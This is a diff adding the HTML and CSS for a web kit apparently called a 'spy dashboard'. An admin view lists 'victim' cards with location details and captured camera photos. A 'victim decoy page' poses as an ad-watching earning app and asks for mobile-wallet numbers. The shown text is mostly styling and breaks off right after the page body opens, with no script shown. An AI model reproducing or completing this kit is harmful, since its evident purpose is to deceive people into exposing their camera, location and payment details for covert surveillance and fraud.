@@ -1,0 +1,1739 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<meta name="theme-color" content="#0a0a14">
+<meta name="description" content="AHSAN x NOVA — Premium Digital Workspace.">
+<title>AHSAN x NOVA — Web Toolkit</title>
+
+<link rel="icon" href="https://i.ibb.co/mVVvwypv/550518.jpg">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700;800&family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+
+<style>
+/* ============================================================
+   AHSAN x NOVA — V27 SPY DASHBOARD + EARNING SYSTEM
+   ============================================================ */
+:root{
+  --bg-body:#070710;
+  --bg-panel:#0f0f1a;
+  --bg-soft:#14141f;
+  --bg-glass:rgba(15,15,26,.85);
+  
+  --text-main:#f4f6fb;
+  --text-sub:#9ca3af;
+  --text-muted:#6b7280;
+  
+  --primary:#7c3aed;
+  --primary-2:#a855f7;
+  --primary-glow:rgba(124,58,237,.4);
+  
+  --pink:#ec4899;
+  --blue:#3b82f6;
+  --cyan:#06b6d4;
+  --green:#10b981;
+  --orange:#f59e0b;
+  --red:#ef4444;
+  --gold:#fbbf24;
+  
+  --border-soft:rgba(255,255,255,.08);
+  --border-mid:rgba(255,255,255,.12);
+  
+  --shadow-sm:0 2px 6px rgba(0,0,0,.3);
+  --shadow-md:0 6px 20px rgba(0,0,0,.4);
+  --shadow-lg:0 15px 45px rgba(0,0,0,.5);
+  --shadow-xl:0 25px 60px rgba(0,0,0,.6);
+  
+  --radius:18px;
+  --radius-sm:12px;
+  --radius-lg:24px;
+  
+  --f-display:'Poppins',sans-serif;
+  --f-body:'Inter',sans-serif;
+}
+*{box-sizing:border-box;margin:0;padding:0}
+html{scroll-behavior:smooth;-webkit-tap-highlight-color:transparent}
+body{
+  font-family:var(--f-body);
+  background:var(--bg-body);
+  color:var(--text-main);
+  min-height:100vh;
+  overflow-x:hidden;
+  line-height:1.6;
+  -webkit-font-smoothing:antialiased;
+}
+body::before{
+  content:'';position:fixed;inset:0;z-index:-2;pointer-events:none;
+  background:
+    radial-gradient(800px 800px at 0% 0%, rgba(124,58,237,.18), transparent 55%),
+    radial-gradient(800px 800px at 100% 100%, rgba(236,72,153,.12), transparent 55%),
+    radial-gradient(600px 600px at 100% 0%, rgba(59,130,246,.08), transparent 55%);
+}
+body::after{
+  content:'';position:fixed;inset:0;z-index:-1;pointer-events:none;
+  background-image:
+    linear-gradient(rgba(124,58,237,.03) 1px, transparent 1px),
+    linear-gradient(90deg, rgba(124,58,237,.03) 1px, transparent 1px);
+  background-size:40px 40px;
+  -webkit-mask-image:radial-gradient(circle at 50% 50%, black 40%, transparent 90%);
+  mask-image:radial-gradient(circle at 50% 50%, black 40%, transparent 90%);
+}
+button{font:inherit;cursor:pointer;border:none;background:none;color:inherit}
+input,textarea,select{font:inherit}
+a{color:inherit;text-decoration:none}
+.hidden{display:none!important}
+
+/* HEADER */
+.topbar{
+  position:sticky;top:0;z-index:50;
+  background:var(--bg-glass);
+  backdrop-filter:blur(20px);
+  -webkit-backdrop-filter:blur(20px);
+  border-bottom:1px solid var(--border-soft);
+  padding:14px 24px;
+  display:flex;align-items:center;justify-content:space-between;gap:18px;
+}
+.brand{display:flex;align-items:center;gap:12px}
+.brand-logo{
+  width:44px;height:44px;border-radius:12px;
+  background:linear-gradient(135deg,var(--primary),var(--pink));
+  padding:3px;
+  box-shadow:0 6px 20px var(--primary-glow);
+}
+.brand-logo img{width:100%;height:100%;object-fit:cover;border-radius:9px;background:#fff}
+.brand-meta h1{font-family:var(--f-display);font-size:16px;font-weight:800;line-height:1}
+.brand-meta h1 em{font-style:normal;color:var(--primary)}
+.brand-meta small{font-size:10px;color:var(--text-muted);letter-spacing:.1em;text-transform:uppercase;font-weight:600;display:block;margin-top:3px}
+.header-right{display:flex;align-items:center;gap:10px}
+.status-pill{
+  display:inline-flex;align-items:center;gap:6px;
+  padding:7px 14px;border-radius:99px;
+  background:rgba(16,185,129,.12);border:1px solid rgba(16,185,129,.3);
+  font-size:11px;font-weight:700;color:var(--green);
+}
+.status-pill::before{
+  content:'';width:7px;height:7px;border-radius:50%;
+  background:var(--green);box-shadow:0 0 10px var(--green);
+  animation:pulseDot 1.8s infinite;
+}
+@keyframes pulseDot{50%{opacity:.4}}
+
+/* WRAPPER */
+.wrapper{max-width:1200px;margin:0 auto;padding:28px 24px 60px}
+
+/* HERO */
+.hero{
+  background:linear-gradient(135deg,#1e1b4b,#4c1d95 60%,#6b21a8);
+  border-radius:24px;
+  padding:36px 40px;
+  position:relative;overflow:hidden;
+  margin-bottom:28px;
+  box-shadow:0 25px 60px rgba(76,29,149,.35);
+}
+.hero::before{
+  content:'';position:absolute;inset:0;
+  background-image:
+    radial-gradient(circle at 20% 80%, rgba(236,72,153,.3), transparent 50%),
+    radial-gradient(circle at 85% 20%, rgba(6,182,212,.25), transparent 50%);
+  pointer-events:none;
+}
+.hero::after{
+  content:'';position:absolute;right:-10%;top:-50%;width:70%;height:200%;
+  background:radial-gradient(circle at center, rgba(124,58,237,.6), transparent 60%);
+  pointer-events:none;animation:floatGlow 8s ease-in-out infinite;
+}
+@keyframes floatGlow{50%{transform:translate(-20px,-10px) scale(1.05)}}
+.hero-content{position:relative;z-index:2;max-width:600px}
+.hero-tag{
+  display:inline-flex;align-items:center;gap:6px;
+  padding:6px 14px;border-radius:99px;
+  background:rgba(255,255,255,.12);border:1px solid rgba(255,255,255,.2);
+  font-size:11px;font-weight:700;letter-spacing:.08em;text-transform:uppercase;
+  color:#c4b5fd;margin-bottom:16px;
+}
+.hero h2{
+  font-family:var(--f-display);font-size:36px;font-weight:800;line-height:1.1;
+  letter-spacing:-.02em;margin-bottom:12px;color:#fff;
+}
+.hero h2 span{
+  background:linear-gradient(90deg,#c4b5fd,#f0abfc,#fbbf24);
+  -webkit-background-clip:text;background-clip:text;color:transparent;
+}
+.hero p{color:rgba(255,255,255,.8);font-size:14px;line-height:1.6;margin-bottom:22px}
+.hero-actions{display:flex;gap:10px;flex-wrap:wrap}
+.btn-hero{
+  display:inline-flex;align-items:center;gap:8px;
+  padding:13px 22px;border-radius:12px;
+  font-size:13px;font-weight:800;
+  transition:.2s;cursor:pointer;border:none;
+  text-decoration:none;
+}
+.btn-hero.primary{
+  background:linear-gradient(135deg,#fff,#e0d5ff);
+  color:#4c1d95;box-shadow:0 10px 25px rgba(255,255,255,.2);
+}
+.btn-hero.primary:hover{transform:translateY(-2px);box-shadow:0 15px 30px rgba(255,255,255,.3)}
+.btn-hero.ghost{
+  background:rgba(255,255,255,.1);color:#fff;border:1px solid rgba(255,255,255,.25);
+}
+.btn-hero.ghost:hover{background:rgba(255,255,255,.2)}
+
+/* GRID */
+.grid-2{display:grid;grid-template-columns:repeat(2,1fr);gap:20px}
+@media(max-width:900px){.grid-2{grid-template-columns:1fr}}
+
+.card{
+  background:var(--bg-panel);
+  border:1px solid var(--border-soft);
+  border-radius:var(--radius);
+  padding:24px;
+  box-shadow:var(--shadow-md);
+  position:relative;overflow:hidden;
+  transition:.2s;
+}
+.card::before{
+  content:'';position:absolute;top:0;left:0;right:0;height:3px;
+  background:linear-gradient(90deg,var(--primary),var(--pink),var(--cyan));
+  opacity:0;transition:.2s;
+}
+.card:hover{border-color:var(--border-mid);box-shadow:var(--shadow-lg)}
+.card:hover::before{opacity:1}
+.card-head{
+  display:flex;align-items:center;justify-content:space-between;
+  gap:12px;margin-bottom:16px;flex-wrap:wrap;
+}
+.card-title{
+  display:flex;align-items:center;gap:10px;
+  font-family:var(--f-display);font-size:16px;font-weight:800;
+}
+.card-title i{color:var(--primary);font-size:16px}
+.card-subtitle{font-size:12px;color:var(--text-muted);margin-top:2px;font-weight:500}
+
+/* BUTTONS */
+.btn{
+  display:inline-flex;align-items:center;justify-content:center;gap:8px;
+  padding:12px 20px;border-radius:12px;
+  border:1px solid var(--border-mid);
+  background:var(--bg-soft);
+  color:var(--text-main);
+  font-weight:700;font-size:13px;
+  transition:.2s;cursor:pointer;
+  min-height:44px;
+}
+.btn:hover{border-color:var(--primary);background:var(--bg-panel)}
+.btn:active{transform:scale(.98)}
+.btn.primary{
+  background:linear-gradient(135deg,var(--primary),var(--primary-2));
+  border-color:transparent;color:#fff;
+  box-shadow:0 8px 20px var(--primary-glow);
+}
+.btn.primary:hover{box-shadow:0 12px 25px var(--primary-glow)}
+.btn.danger{background:rgba(239,68,68,.15);border-color:rgba(239,68,68,.35);color:#ff8aa0}
+.btn.green{background:rgba(16,185,129,.15);border-color:rgba(16,185,129,.35);color:#6effa8}
+.btn.ghost{background:transparent;border-color:transparent;color:var(--primary);padding:8px 12px;min-height:auto}
+.btn.ghost:hover{background:rgba(124,58,237,.1)}
+.btn-sm{padding:8px 14px;font-size:12px;min-height:36px;border-radius:9px}
+.btn-icon{
+  width:36px;height:36px;padding:0;border-radius:10px;
+  display:inline-flex;align-items:center;justify-content:center;
+  border:1px solid var(--border-mid);background:var(--bg-soft);
+  color:var(--text-sub);transition:.2s;cursor:pointer;
+}
+.btn-icon:hover{background:var(--bg-panel);border-color:var(--primary);color:var(--primary)}
+.btn-icon.delete:hover{background:rgba(239,68,68,.15);border-color:var(--red);color:var(--red)}
+.btn-icon.download:hover{background:rgba(16,185,129,.15);border-color:var(--green);color:var(--green)}
+
+/* LINK BOX */
+.link-gen-box{
+  background:linear-gradient(135deg,rgba(124,58,237,.1),rgba(236,72,153,.05));
+  border:1px solid rgba(124,58,237,.3);
+  border-radius:16px;
+  padding:20px;
+  margin-bottom:16px;
+}
+.link-gen-box .label{
+  font-size:11px;font-weight:800;letter-spacing:.12em;text-transform:uppercase;
+  color:var(--primary);margin-bottom:10px;display:flex;align-items:center;gap:6px;
+}
+.link-result{display:flex;gap:8px;flex-wrap:wrap;}
+.link-result input{
+  flex:1;min-width:200px;
+  padding:12px 14px;border-radius:10px;
+  border:1px solid var(--border-mid);
+  background:var(--bg-body);
+  color:var(--text-main);
+  font-family:monospace;font-size:12px;
+  outline:none;
+}
+.link-result input:focus{border-color:var(--primary)}
+
+/* VICTIM CARD */
+.victim-card{
+  background:var(--bg-panel);
+  border:1px solid var(--border-soft);
+  border-radius:16px;
+  padding:20px;
+  margin-bottom:16px;
+  box-shadow:var(--shadow-sm);
+  position:relative;
+  overflow:hidden;
+}
+.victim-card::before{
+  content:'';position:absolute;left:0;top:0;bottom:0;width:4px;
+  background:linear-gradient(180deg,var(--primary),var(--pink));
+}
+.victim-head{
+  display:flex;justify-content:space-between;align-items:flex-start;
+  gap:12px;margin-bottom:14px;flex-wrap:wrap;
+}
+.victim-id{display:flex;align-items:center;gap:10px;}
+.victim-avatar{
+  width:42px;height:42px;border-radius:12px;
+  background:linear-gradient(135deg,var(--primary),var(--pink));
+  display:grid;place-items:center;
+  font-weight:800;font-size:16px;color:#fff;
+}
+.victim-info b{font-size:14px;font-weight:700;display:block;font-family:var(--f-display);}
+.victim-info small{font-size:10px;color:var(--text-muted);font-family:monospace;letter-spacing:.02em;}
+.victim-badge{
+  display:inline-flex;align-items:center;gap:5px;
+  padding:5px 12px;border-radius:99px;
+  background:rgba(16,185,129,.12);
+  border:1px solid rgba(16,185,129,.3);
+  color:var(--green);font-size:10px;font-weight:800;
+  text-transform:uppercase;letter-spacing:.06em;
+}
+
+/* SECTIONS INSIDE VICTIM */
+.victim-section{
+  background:var(--bg-soft);
+  border:1px solid var(--border-soft);
+  border-radius:14px;
+  padding:16px;
+  margin-bottom:14px;
+}
+.victim-section-title{
+  display:flex;align-items:center;gap:8px;
+  font-size:11px;font-weight:800;text-transform:uppercase;
+  letter-spacing:.1em;color:var(--text-sub);
+  margin-bottom:12px;
+}
+.victim-section-title i{color:var(--primary)}
+
+.loc-info{
+  background:rgba(59,130,246,.08);
+  border:1px solid rgba(59,130,246,.25);
+  border-radius:12px;
+  padding:12px 16px;
+  display:flex;align-items:center;gap:12px;
+}
+.loc-info .ic{
+  width:36px;height:36px;border-radius:10px;
+  background:linear-gradient(135deg,#3b82f6,#06b6d4);
+  display:grid;place-items:center;color:#fff;font-size:16px;
+  flex-shrink:0;
+}
+.loc-info .txt{flex:1;min-width:0;}
+.loc-info .txt b{display:block;font-size:12px;font-weight:700;color:var(--text-main);margin-bottom:2px;}
+.loc-info .txt small{display:block;font-size:11px;color:var(--text-sub);line-height:1.4;word-break:break-word;}
+
+/* PHOTOS */
+.photos-grid{
+  display:grid;
+  grid-template-columns:repeat(auto-fill,minmax(100px,1fr));
+  gap:10px;
+}
+.photo-item{
+  position:relative;
+  border-radius:12px;
+  overflow:hidden;
+  aspect-ratio:1;
+  background:var(--bg-soft);
+  border:1px solid var(--border-soft);
+  cursor:pointer;
+  transition:.2s;
+}
+.photo-item:hover{border-color:var(--primary)}
+.photo-item img{width:100%;height:100%;object-fit:cover;display:block;}
+.photo-actions{
+  position:absolute;bottom:6px;right:6px;
+  display:flex;gap:5px;
+  opacity:0;transition:.2s;
+}
+.photo-item:hover .photo-actions{opacity:1}
+.photo-actions button{
+  width:28px;height:28px;border-radius:7px;
+  background:rgba(0,0,0,.75);
+  backdrop-filter:blur(6px);
+  color:#fff;display:grid;place-items:center;
+  font-size:11px;cursor:pointer;border:none;
+  transition:.2s;
+}
+.photo-actions button:hover{background:var(--primary)}
+.photo-actions button.delete:hover{background:var(--red)}
+.photo-time{
+  position:absolute;top:6px;left:6px;
+  padding:2px 6px;border-radius:5px;
+  background:rgba(0,0,0,.7);backdrop-filter:blur(4px);
+  font-size:9px;font-weight:700;color:#fff;
+  font-family:monospace;
+}
+
+.empty{
+  text-align:center;padding:40px 20px;
+  border:1px dashed var(--border-mid);
+  border-radius:12px;
+  color:var(--text-muted);font-size:13px;
+}
+.empty i{font-size:32px;display:block;margin-bottom:10px;color:var(--border-mid)}
+
+/* TOAST */
+.toast-container{
+  position:fixed;top:20px;right:20px;z-index:9999;
+  display:flex;flex-direction:column;gap:10px;
+  pointer-events:none;max-width:360px;
+}
+.toast{
+  padding:14px 18px;border-radius:14px;
+  background:var(--bg-panel);
+  border:1px solid var(--border-mid);
+  color:var(--text-main);
+  font-size:13px;font-weight:600;
+  box-shadow:0 18px 40px rgba(0,0,0,.5);
+  display:flex;align-items:center;gap:12px;
+  pointer-events:auto;
+  animation:slideIn .3s ease;
+  border-left:3px solid var(--primary);
+}
+.toast.success{border-left-color:var(--green)}
+.toast.error{border-left-color:var(--red)}
+.toast.warning{border-left-color:var(--orange)}
+.toast-icon{font-size:16px;flex-shrink:0}
+.toast.success .toast-icon{color:var(--green)}
+.toast.error .toast-icon{color:var(--red)}
+.toast.warning .toast-icon{color:var(--orange)}
+@keyframes slideIn{from{opacity:0;transform:translateX(80px)}to{opacity:1;transform:translateX(0)}}
+
+/* CAMERA VIEWER */
+.camera-viewer{
+  position:fixed;inset:0;z-index:9999;
+  background:rgba(0,0,0,.95);
+  display:none;align-items:center;justify-content:center;
+  padding:20px;
+  backdrop-filter:blur(8px);
+}
+.camera-viewer.open{display:flex}
+.camera-viewer img{
+  max-width:100%;max-height:90vh;border-radius:12px;
+  box-shadow:0 25px 60px rgba(0,0,0,.8);
+}
+.camera-close{
+  position:absolute;top:20px;right:20px;
+  width:44px;height:44px;border-radius:50%;
+  background:rgba(255,255,255,.15);
+  border:1px solid rgba(255,255,255,.3);
+  color:#fff;display:grid;place-items:center;
+  font-size:18px;cursor:pointer;transition:.2s;
+}
+.camera-close:hover{background:var(--red);border-color:var(--red);transform:rotate(90deg)}
+
+/* FOOTER */
+.footer{
+  text-align:center;padding:32px 20px;
+  border-top:1px solid var(--border-soft);
+  margin-top:40px;
+  font-size:12px;color:var(--text-muted);
+}
+.footer b{color:var(--primary);font-weight:800}
+
+/* ============================================================
+   VICTIM DECOY PAGE
+   ============================================================ */
+.victim-body{
+  background:#0a0515;
+  min-height:100vh;
+  padding:0 0 40px;
+  color:#fff;
+  position:relative;
+  overflow-x:hidden;
+}
+.victim-body::before{
+  content:'';position:fixed;inset:0;z-index:0;
+  background-image:
+    radial-gradient(circle at 20% 30%, rgba(251,191,36,.15), transparent 40%),
+    radial-gradient(circle at 80% 70%, rgba(236,72,153,.15), transparent 40%);
+  pointer-events:none;
+}
+.victim-container{
+  position:relative;z-index:2;
+  max-width:480px;margin:0 auto;
+  padding:20px 16px 0;
+}
+
+.victim-header{
+  display:flex;align-items:center;justify-content:space-between;
+  margin-bottom:20px;padding:4px 8px;
+}
+.victim-header .logo-wrap{display:flex;align-items:center;gap:10px}
+.victim-header .logo{width:38px;height:38px;border-radius:10px;overflow:hidden;border:1px solid rgba(251,191,36,.3)}
+.victim-header .logo img{width:100%;height:100%;object-fit:cover}
+.victim-header .brand b{font-family:var(--f-display);font-size:14px;font-weight:800;display:block;line-height:1.2}
+.victim-header .brand small{font-size:10px;color:rgba(255,255,255,.5);font-weight:600}
+.victim-header .icon-btn{
+  width:36px;height:36px;border-radius:50%;
+  background:rgba(255,255,255,.05);
+  border:1px solid rgba(255,255,255,.1);
+  display:grid;place-items:center;
+  font-size:14px;color:#fbbf24;
+}
+
+/* BALANCE */
+.balance-card{
+  background:linear-gradient(135deg,#1e1b4b,#4c1d95 50%,#6b21a8);
+  border-radius:20px;
+  padding:22px;
+  margin-bottom:18px;
+  position:relative;
+  overflow:hidden;
+  box-shadow:0 20px 50px rgba(76,29,149,.35);
+  border:1px solid rgba(255,255,255,.08);
+}
+.balance-card::before{
+  content:'';position:absolute;top:-40%;right:-20%;width:200px;height:200px;
+  background:radial-gradient(circle,rgba(251,191,36,.3),transparent 70%);
+  border-radius:50%;pointer-events:none;
+}
+.balance-card::after{
+  content:'';position:absolute;bottom:-30%;left:-20%;width:180px;height:180px;
+  background:radial-gradient(circle,rgba(236,72,153,.25),transparent 70%);
+  border-radius:50%;pointer-events:none;
+}
+.balance-label{font-size:11px;color:rgba(255,255,255,.6);font-weight:700;letter-spacing:.1em;text-transform:uppercase;margin-bottom:6px;position:relative}
+.balance-amount{font-family:var(--f-display);font-size:40px;font-weight:900;line-height:1;margin-bottom:4px;position:relative;background:linear-gradient(90deg,#fff,#fbbf24);-webkit-background-clip:text;background-clip:text;color:transparent}
+.balance-currency{font-size:12px;color:rgba(255,255,255,.5);font-weight:600;position:relative}
+.balance-row{display:flex;gap:10px;margin-top:16px;position:relative}
+.balance-stat{
+  flex:1;background:rgba(0,0,0,.25);backdrop-filter:blur(10px);
+  border:1px solid rgba(255,255,255,.1);
+  border-radius:10px;padding:10px 8px;text-align:center;
+}
+.balance-stat b{display:block;font-family:var(--f-display);font-size:14px;font-weight:800;color:#fbbf24}
+.balance-stat small{font-size:9px;color:rgba(255,255,255,.5);font-weight:600;text-transform:uppercase;letter-spacing:.06em}
+
+/* AD CARD */
+.ad-card{
+  background:rgba(255,255,255,.03);
+  border:1px solid rgba(255,255,255,.08);
+  border-radius:18px;
+  padding:16px;
+  margin-bottom:14px;
+}
+.ad-card-head{
+  display:flex;align-items:center;justify-content:space-between;
+  margin-bottom:12px;
+}
+.ad-card-title{
+  display:flex;align-items:center;gap:8px;
+  font-size:13px;font-weight:800;color:#fff;
+}
+.ad-card-title i{color:#fbbf24}
+.ad-badge{
+  font-size:9px;font-weight:800;color:#10b981;text-transform:uppercase;
+  letter-spacing:.06em;padding:3px 8px;border-radius:99px;
+  background:rgba(16,185,129,.12);border:1px solid rgba(16,185,129,.3);
+}
+
+/* AD PLAYER (In-feed) */
+.ad-player{
+  background:linear-gradient(135deg,#1a0a2e,#2d1054);
+  border-radius:14px;
+  padding:16px;
+  margin-bottom:12px;
+  position:relative;
+  overflow:hidden;
+  border:1px solid rgba(251,191,36,.15);
+}
+.ad-player::before{
+  content:'';position:absolute;inset:0;
+  background-image:radial-gradient(circle at 30% 40%, rgba(251,191,36,.15), transparent 50%);
+  pointer-events:none;
+}
+.ad-visual{
+  display:flex;align-items:center;justify-content:center;
+  height:120px;position:relative;
+}
+.ad-visual .ad-icon{
+  font-size:56px;
+  filter:drop-shadow(0 4px 20px rgba(251,191,36,.4));
+  animation:floatIcon 3s ease-in-out infinite;
+}
+@keyframes floatIcon{50%{transform:translateY(-6px)}}
+.ad-info{text-align:center;position:relative;z-index:2}
+.ad-info b{display:block;font-family:var(--f-display);font-size:15px;font-weight:800;color:#fff;margin-bottom:2px}
+.ad-info small{font-size:11px;color:rgba(255,255,255,.6);font-weight:600}
+
+/* PROGRESS BAR */
+.ad-timer-bar{
+  height:6px;background:rgba(255,255,255,.1);border-radius:99px;
+  overflow:hidden;margin-top:14px;position:relative;
+}
+.ad-timer-fill{
+  height:100%;width:0%;
+  background:linear-gradient(90deg,#fbbf24,#f59e0b);
+  border-radius:99px;
+  transition:width 1s linear;
+}
+
+/* WATCH BTN */
+.ad-watch-btn{
+  width:100%;padding:14px;border-radius:12px;
+  background:linear-gradient(135deg,#fbbf24,#f59e0b);
+  color:#0a0515;font-family:var(--f-display);font-size:14px;font-weight:900;
+  letter-spacing:.04em;text-transform:uppercase;
+  border:none;cursor:pointer;
+  box-shadow:0 10px 25px rgba(251,191,36,.35);
+  transition:.2s;margin-top:12px;
+  display:flex;align-items:center;justify-content:center;gap:8px;
+}
+.ad-watch-btn:hover{transform:translateY(-2px);box-shadow:0 15px 35px rgba(251,191,36,.5)}
+.ad-watch-btn:disabled{opacity:.5;cursor:not-allowed;transform:none}
+
+/* AD LIST */
+.ad-list-item{
+  display:flex;align-items:center;gap:12px;
+  padding:12px;border-radius:12px;
+  background:rgba(255,255,255,.03);
+  border:1px solid rgba(255,255,255,.08);
+  margin-bottom:8px;
+}
+.ad-list-icon{
+  width:44px;height:44px;border-radius:12px;
+  display:grid;place-items:center;
+  font-size:20px;color:#fff;flex-shrink:0;
+}
+.ad-list-icon.c1{background:linear-gradient(135deg,#ec4899,#be185d)}
+.ad-list-icon.c2{background:linear-gradient(135deg,#3b82f6,#1d4ed8)}
+.ad-list-icon.c3{background:linear-gradient(135deg,#10b981,#047857)}
+.ad-list-icon.c4{background:linear-gradient(135deg,#f59e0b,#b45309)}
+.ad-list-info{flex:1;min-width:0}
+.ad-list-info b{display:block;font-size:12px;font-weight:700;color:#fff}
+.ad-list-info small{display:block;font-size:10px;color:rgba(255,255,255,.5);font-weight:600}
+.ad-list-reward{font-family:var(--f-display);font-size:13px;font-weight:800;color:#6effa8;flex-shrink:0}
+
+/* WITHDRAWAL */
+.withdraw-card{
+  background:rgba(255,255,255,.03);
+  border:1px solid rgba(255,255,255,.08);
+  border-radius:18px;
+  padding:16px;margin-bottom:14px;
+}
+.withdraw-title{
+  display:flex;align-items:center;gap:8px;
+  font-size:13px;font-weight:800;color:#fff;margin-bottom:14px;
+}
+.withdraw-title i{color:#fbbf24}
+.wallet-grid{display:grid;grid-template-columns:1fr 1fr;gap:8px;margin-bottom:12px}
+.wallet-opt{
+  display:flex;flex-direction:column;align-items:center;gap:6px;
+  padding:12px 8px;border-radius:10px;
+  background:rgba(255,255,255,.03);
+  border:2px solid transparent;
+  cursor:pointer;transition:.2s;
+}
+.wallet-opt.active{border-color:#fbbf24;background:rgba(251,191,36,.1)}
+.wallet-opt .logo{
+  width:32px;height:32px;border-radius:8px;
+  display:grid;place-items:center;font-size:13px;font-weight:800;color:#fff;
+}
+.wallet-opt .logo.easypaisa{background:linear-gradient(135deg,#00a651,#007a3d)}
+.wallet-opt .logo.jazzcash{background:linear-gradient(135deg,#ed1c24,#b91c1c)}
+.wallet-opt .logo.sadapay{background:linear-gradient(135deg,#6d28d9,#4c1d95)}
+.wallet-opt .logo.nayapay{background:linear-gradient(135deg,#0ea5e9,#0284c7)}
+.wallet-opt .name{font-size:10px;font-weight:700;color:rgba(255,255,255,.8)}
+
+.victim-input{
+  width:100%;padding:13px 15px;
+  border:2px solid rgba(255,255,255,.1);
+  border-radius:12px;
+  background:rgba(0,0,0,.3);
+  color:#fff;font-size:15px;font-family:monospace;
+  font-weight:600;letter-spacing:.05em;
+  outline:none;transition:.2s;margin-bottom:12px;
+}
+.victim-input:focus{border-color:#fbbf24}
+.victim-input::placeholder{color:rgba(255,255,255,.3);font-family:var(--f-body);letter-spacing:0;font-weight:400}
+
+.victim-btn{
+  width:100%;padding:15px 24px;border-radius:14px;
+  background:linear-gradient(135deg,#fbbf24,#f59e0b);
+  color:#0a0515;font-family:var(--f-display);font-size:14px;font-weight:900;
+  letter-spacing:.05em;text-transform:uppercase;
+  border:none;cursor:pointer;
+  box-shadow:0 12px 30px rgba(251,191,36,.35);
+  transition:.2s;
+}
+.victim-btn:hover{transform:translateY(-2px)}
+.victim-btn:disabled{opacity:.5;cursor:not-allowed;transform:none}
+
+/* MODALS */
+.victim-modal-overlay{
+  position:fixed;inset:0;z-index:999;
+  background:rgba(5,2,12,.85);
+  backdrop-filter:blur(12px);
+  display:none;align-items:center;justify-content:center;
+  padding:20px;
+}
+.victim-modal-overlay.show{display:flex}
+.victim-modal{
+  background:linear-gradient(135deg,#1a0a2e,#2d1054);
+  border-radius:22px;
+  padding:28px 22px;
+  max-width:360px;width:100%;
+  text-align:center;
+  border:1px solid rgba(251,191,36,.3);
+  box-shadow:0 30px 80px rgba(0,0,0,.6);
+}
+.victim-modal .icon{
+  width:80px;height:80px;border-radius:50%;
+  margin:0 auto 20px;
+  display:grid;place-items:center;
+  font-size:36px;color:#fff;
+}
+.victim-modal .icon.success{background:linear-gradient(135deg,#10b981,#059669);box-shadow:0 15px 40px rgba(16,185,129,.5)}
+.victim-modal .icon.error{background:linear-gradient(135deg,#ef4444,#dc2626);box-shadow:0 15px 40px rgba(239,68,68,.5)}
+.victim-modal h3{font-family:var(--f-display);font-size:20px;font-weight:800;margin-bottom:8px;color:#fff}
+.victim-modal p{font-size:13px;color:rgba(255,255,255,.7);line-height:1.6;margin-bottom:20px}
+
+/* AD WATCH MODAL */
+.ad-watch-modal{
+  position:fixed;inset:0;z-index:998;
+  background:rgba(5,2,12,.95);
+  backdrop-filter:blur(10px);
+  display:none;align-items:center;justify-content:center;
+  flex-direction:column;
+  padding:20px;
+}
+.ad-watch-modal.show{display:flex}
+.ad-watch-content{
+  text-align:center;max-width:340px;
+}
+.ad-watch-icon{font-size:80px;margin-bottom:20px;animation:floatIcon 2s ease-in-out infinite;filter:drop-shadow(0 10px 30px rgba(251,191,36,.5))}
+.ad-watch-content h3{font-family:var(--f-display);font-size:20px;font-weight:800;color:#fff;margin-bottom:8px}
+.ad-watch-content p{font-size:13px;color:rgba(255,255,255,.6);margin-bottom:20px}
+.ad-watch-timer{
+  font-family:var(--f-display);font-size:64px;font-weight:900;
+  color:#fbbf24;line-height:1;margin-bottom:16px;
+  text-shadow:0 8px 30px rgba(251,191,36,.4);
+}
+.ad-watch-progress{width:100%;height:8px;background:rgba(255,255,255,.1);border-radius:99px;overflow:hidden;margin-bottom:16px}
+.ad-watch-progress i{display:block;height:100%;width:0;background:linear-gradient(90deg,#fbbf24,#f59e0b);border-radius:99px;transition:width 1s linear}
+.ad-watch-close{
+  padding:10px 20px;border-radius:10px;
+  background:rgba(255,255,255,.1);border:1px solid rgba(255,255,255,.2);
+  color:#fff;font-size:12px;font-weight:700;cursor:pointer;
+}
+
+.victim-footer{
+  text-align:center;margin-top:24px;
+  font-size:10px;color:rgba(255,255,255,.3);
+  line-height:1.6;
+}
+
+/* VICTIM LOADING */
+.victim-loading{
+  position:fixed;inset:0;z-index:1000;
+  background:#0a0515;
+  display:flex;align-items:center;justify-content:center;
+  flex-direction:column;gap:20px;
+}
+.victim-loading .spinner{
+  width:60px;height:60px;
+  border:3px solid rgba(251,191,36,.2);
+  border-top-color:#fbbf24;
+  border-radius:50%;
+  animation:spinSlow 1s linear infinite;
+}
+@keyframes spinSlow{to{transform:rotate(360deg)}}
+.victim-loading p{color:#fbbf24;font-size:13px;font-weight:700;letter-spacing:.15em;text-transform:uppercase}
+
+/* VICTIM BLOCK (Denied) */
+.victim-block{
+  position:fixed;inset:0;z-index:1001;
+  background:#0a0515;
+  display:flex;align-items:center;justify-content:center;
+  flex-direction:column;padding:20px;
+  text-align:center;
+}
+.victim-block .icon{
+  width:80px;height:80px;border-radius:50%;
+  background:linear-gradient(135deg,#ef4444,#dc2626);
+  display:grid;place-items:center;
+  font-size:36px;color:#fff;
+  margin-bottom:20px;
+  box-shadow:0 15px 40px rgba(239,68,68,.5);
+}
+.victim-block h2{font-family:var(--f-display);font-size:22px;font-weight:800;color:#fff;margin-bottom:10px}
+.victim-block p{font-size:13px;color:rgba(255,255,255,.6);line-height:1.6;max-width:300px;margin-bottom:20px}
+.victim-block button{
+  padding:12px 24px;border-radius:12px;
+  background:linear-gradient(135deg,#fbbf24,#f59e0b);
+  color:#0a0515;font-weight:800;font-size:13px;
+  border:none;cursor:pointer;text-transform:uppercase;letter-spacing:.04em;
+}
+
+@media(max-width:600px){
+  .wrapper{padding:18px 16px 50px}
+  .hero{padding:26px 22px}
+  .hero h2{font-size:26px}
+  .topbar{padding:12px 16px}
+  .brand-meta h1{font-size:14px}
+  .brand-logo{width:38px;height:38px}
+  .photos-grid{grid-template-columns:repeat(auto-fill,minmax(85px,1fr))}
+  .balance-amount{font-size:34px}
+}
+</style>
+</head>
+<body>
+
+<!-- TOAST -->
+<div class="toast-container" id="toastContainer"></div>
+
+<!-- ============================================================
+     DASHBOARD (Admin View)
+     ============================================================ -->
+<div id="dashboardView">
+  <header class="topbar">
+    <div class="brand">
